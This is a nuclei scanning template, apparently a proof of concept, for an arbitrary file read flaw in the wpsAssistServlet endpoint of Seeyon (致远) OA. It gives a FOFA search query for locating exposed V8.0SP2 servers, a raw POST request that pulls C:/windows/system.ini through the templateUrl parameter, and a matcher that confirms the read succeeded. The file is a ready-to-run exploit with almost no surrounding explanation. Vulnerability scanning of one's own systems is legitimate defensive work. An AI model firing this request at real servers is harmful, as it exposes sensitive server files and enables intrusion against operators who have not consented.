# Add your nuclei formatted PoC!
id: seeyon-oa-wpsAssistServlet-file-read
info:
  name: 致远OA-wpsAssistServlet-POST-文件读取
  author: 蜜汁狗蛋
  severity: critical
  description: 致远OA wpsAssistServlet接口存在一个任意文件读取漏洞。攻击者可以利用此漏洞下载服务器任意敏感文件。
  tags: [Seeyon, OA, 任意文件读取]
  metadata:
    fofa-query: app="致远互联-OA" && title="V8.0SP2"   
variables:
  file_name: "{{to_lower(rand_text_alpha(8))}}.jsp"
  file_content: "{{to_lower(rand_text_alpha(8))}}"
  
requests:
  - raw:
      - |+
        POST /seeyon/wpsAssistServlet HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept: */*
        Connection: Keep-Alive
        Content-Length: 47
        Content-Type: application/x-www-form-urlencoded

        flag=template&templateUrl=C:/windows/system.ini

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains(body, 'bit app support')"
author: 蜜汁狗蛋
